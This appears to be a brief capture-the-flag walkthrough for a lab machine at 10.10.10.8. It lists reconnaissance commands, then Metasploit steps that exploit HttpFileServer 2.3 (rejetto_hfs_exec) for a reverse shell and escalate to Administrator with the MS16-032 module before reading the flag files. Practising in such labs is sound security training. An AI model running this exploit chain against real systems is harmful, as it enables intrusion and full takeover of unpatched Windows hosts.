ping 10.10.10.8
whatweb 10.10.10.8

nmap 10.10.10.8 -> HttpFileServer 2.3

msfconsole
search httpfileserver 2.3

use exploit/windows/http/rejetto_hfs_exec
set lport, lhost and rhost
run

cd /Users/kostas
get user.txt

CVE 2016-0099 (https://www.exploit-db.com/exploits/39719)
search MS16-032

use windows/local/ms16_032_secondary_logon_handle_privesc
set lport, lhost and session
run

cd Administrator/Desktop
get root.txt